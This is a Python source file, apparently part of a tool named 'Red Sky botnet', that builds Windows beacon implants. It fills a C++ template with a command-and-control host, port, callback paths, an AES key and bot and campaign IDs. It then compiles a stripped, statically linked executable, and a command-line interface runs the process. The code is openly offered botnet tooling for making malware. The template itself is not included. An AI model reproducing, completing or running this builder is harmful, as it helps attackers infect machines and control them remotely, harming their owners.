# language: Python, file: Program/botnet/builder.py, target: Red Sky botnet — beacon builder
# Compile a Windows beacon from a template. Injects the C2 host, port, path,
# AES key, and a fresh campaign ID. Detects the toolchain; warns cleanly if
# the template isn't there yet (Build 13 lands it).

import json
import os
import re
import shutil
import subprocess
import sys
import uuid
from pathlib import Path
from typing import Dict, List, Optional

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv, print_bullet
from Program.utils.paths import OUTPUT_DIR, PROGRAM_DIR
from Program.c2.protocol import gen_bot_key, key_hex


TEMPLATE_DIR = PROGRAM_DIR / "botnet" / "templates"
BEACON_TEMPLATE = TEMPLATE_DIR / "beacon.cpp"
BUILD_DIR = OUTPUT_DIR / "build"


class BeaconBuilder:
    def __init__(self):
        self.build_dir = BUILD_DIR
        self.build_dir.mkdir(parents=True, exist_ok=True)

    # ── toolchain ──
    def find_compiler(self) -> Optional[str]:
        for cc in ("x86_64-w64-mingw32-g++", "x86_64-w64-mingw32-gcc"):
            if shutil.which(cc):
                return cc
        return None

    def toolchain_status(self) -> Dict:
        cc = self.find_compiler()
        return {
            "compiler": cc or "MISSING",
            "strip": shutil.which("strip") or "MISSING",
            "upx": shutil.which("upx") or "MISSING",
            "template": str(BEACON_TEMPLATE) if BEACON_TEMPLATE.exists() else "MISSING",
        }

    # ── config injection ──
    def _inject(self, source: str, cfg: Dict) -> str:
        out = source
        replacements = {
            "{{C2_HOST}}":       cfg["host"],
            "{{C2_PORT}}":       str(cfg["port"]),
            "{{C2_BEACON_PATH}}": cfg["beacon_path"],
            "{{C2_RESULT_PATH}}": cfg["result_path"],
            "{{C2_TLS}}":        "1" if cfg["tls"] else "0",
            "{{C2_SLEEP}}":      str(cfg["sleep"]),
            "{{C2_JITTER}}":     str(cfg["jitter"]),
            "{{BOT_ID}}":        cfg["bot_id"],
            "{{AES_KEY_HEX}}":   cfg["aes_key_hex"],
            "{{CAMPAIGN}}":      cfg["campaign"],
        }
        for placeholder, value in replacements.items():
            out = out.replace(placeholder, value)
        return out

    def _validate_injection(self, source: str) -> List[str]:
        """Find any remaining {{...}} placeholders — should be empty."""
        return re.findall(r"\{\{[A-Z0-9_]+\}\}", source)

    # ── build ──
    def build(self, host: str, port: int, tls: bool = True,
              sleep: int = 30, jitter: float = 0.3,
              output_name: str = "", source_template: str = "") -> Optional[Path]:
        cc = self.find_compiler()
        if not cc:
            print_err("mingw-w64 not found")
            print_info("install with: sudo apt install mingw-w64")
            return None

        tpl = Path(source_template) if source_template else BEACON_TEMPLATE
        if not tpl.exists():
            print_warn(f"beacon template not present: {tpl}")
            print_info("the C++ beacon template lands in Build 13")
            print_info("when it does, this command will compile it end-to-end")
            print()
            print_info("preview of what the build would do:")
            print_kv("compiler", cc)
            print_kv("host", host)
            print_kv("port", port)
            print_kv("tls", tls)
            print_kv("sleep", f"{sleep}s")
            print_kv("jitter", jitter)
            print_kv("template", tpl)
            return None

        # build config
        bot_id = str(uuid.uuid4())
        aes_key = gen_bot_key()
        campaign = f"c-{uuid.uuid4().hex[:8]}"

        cfg = {
            "host": host,
            "port": port,
            "tls": tls,
            "sleep": sleep,
            "jitter": jitter,
            "bot_id": bot_id,
            "aes_key_hex": key_hex(aes_key),
            "campaign": campaign,
            "beacon_path": "/api/beacon",
            "result_path": "/api/result",
        }

        # copy + inject
        out_cpp = self.build_dir / "beacon_built.cpp"
        template_src = tpl.read_text(encoding="utf-8")
        injected = self._inject(template_src, cfg)

        leftovers = self._validate_injection(injected)
        if leftovers:
            print_warn(f"unreplaced placeholders remain: {', '.join(leftovers[:5])}")
            print_warn("beacon may not work correctly")

        out_cpp.write_text(injected, encoding="utf-8")

        # compile
        out_name = output_name or f"beacon_{bot_id[:8]}.exe"
        out_exe = self.build_dir / out_name

        cmd = [
            cc, "-O2", "-s", "-static", "-std=c++20",
            "-I", str(TEMPLATE_DIR),
            "-o", str(out_exe), str(out_cpp),
            "-lws2_32", "-lwinhttp", "-lbcrypt", "-ladvapi32",
        ]
        print_info(f"compiling {out_name}")
        print_kv("cc", cc)
        print_kv("out", out_exe)
        print_kv("bot id", bot_id)
        print_kv("campaign", campaign)
        print()

        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        except subprocess.TimeoutExpired:
            print_err("compilation timed out")
            return None
        except subprocess.SubprocessError as e:
            print_err(f"compilation failed: {e}")
            return None

        if r.returncode != 0:
            print_err("compiler returned non-zero")
            print(r.stderr[-2000:] if r.stderr else "(no stderr)")
            return None

        if not out_exe.exists():
            print_err("compiler produced no output file")
            return None

        size_kb = out_exe.stat().st_size / 1024
        print_ok(f"built {out_exe.name} ({size_kb:.1f} KB)")

        # optional strip
        if shutil.which("strip"):
            subprocess.run(["strip", str(out_exe)], check=False)
            size_kb = out_exe.stat().st_size / 1024
            print_ok(f"stripped to {size_kb:.1f} KB")

        # save config next to the binary
        cfg_file = out_exe.with_suffix(".json")
        cfg_file.write_text(json.dumps(cfg, indent=2))
        print_kv("config", cfg_file)

        return out_exe


def cmd_check() -> int:
    b = BeaconBuilder()
    st = b.toolchain_status()
    print_info("beacon build toolchain")
    print()
    for k, v in st.items():
        if v == "MISSING":
            print(f"  {SCARLET}░{RESET} {BONE}{k:<12}{RESET} {CLOT}missing{RESET}")
        else:
            print(f"  {OK}▓{RESET} {BONE}{k:<12}{RESET} {ASH}{v}{RESET}")
    print()
    if st["template"] == "MISSING":
        print_info("build 13 will drop beacon.cpp into Program/botnet/templates/")
    return 0


def cmd_build(args) -> int:
    import argparse
    p = argparse.ArgumentParser(prog="redsky botnet build", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("--host", required=False)
    p.add_argument("--port", type=int, default=443)
    p.add_argument("--no-tls", action="store_true")
    p.add_argument("--sleep", type=int, default=30)
    p.add_argument("--jitter", type=float, default=0.3)
    p.add_argument("--out", default="")
    p.add_argument("--template", default="")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky botnet build --host H [--port 443] [--no-tls] [--sleep 30] [--jitter 0.3]")
        return 2

    if ns.help:
        print_info("redsky botnet build --host <c2.example.tld> [--port 443] [--no-tls]")
        print_info("  --sleep 30    beacon sleep interval in seconds")
        print_info("  --jitter 0.3  ±30% randomness on sleep")
        print_info("  --out file.exe")
        return 0

    if not ns.host:
        print_err("--host required")
        return 2

    b = BeaconBuilder()
    result = b.build(
        host=ns.host, port=ns.port, tls=not ns.no_tls,
        sleep=ns.sleep, jitter=ns.jitter,
        output_name=ns.out, source_template=ns.template,
    )
    return 0 if result else 1


def run_cli(args) -> int:
    if not args or args[0] == "check":
        return cmd_check()
    if args[0] == "build":
        return cmd_build(args[1:])
    print_err(f"unknown builder action: {args[0]}")
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
